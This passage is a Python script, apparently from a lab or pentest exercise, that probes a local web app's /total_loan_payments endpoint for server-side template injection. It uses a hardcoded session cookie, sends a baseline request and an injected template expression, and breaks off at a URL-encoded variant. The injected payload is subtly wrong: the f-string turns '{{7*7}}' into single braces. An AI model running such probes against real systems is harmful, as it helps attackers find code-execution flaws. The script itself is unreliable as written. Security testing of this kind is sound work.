import requests
import urllib.parse

base_url = "http://127.0.0.1:5000"
session_cookie = "session=eyJ1c2VyX2lkIjoxfQ.aVYRkA.NZrGBUBLWhE1H3H_nJGpmrxsh5A"
headers = {"Cookie": session_cookie}

print("TESTING /total_loan_payments RENDERING MECHANISM")

# Baseline
print("\n[1] Baseline:")
resp = requests.get(f"{base_url}/total_loan_payments?principal=1000&interest=5&term=12", headers=headers, timeout=10)
print(f"Status: {resp.status_code}")
print(f"Content-Type: {resp.headers.get('content-type')}")
print(f"Response: {resp.text}")

# Direct SSTI
print("\n[2] Direct SSTI:")
resp = requests.get(f"{base_url}/total_loan_payments?principal={{7*7}}&interest=5&term=12", headers=headers, timeout=10)
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")

# URL-encoded SSTI
print("\n[3] URL-encoded SSTI:")
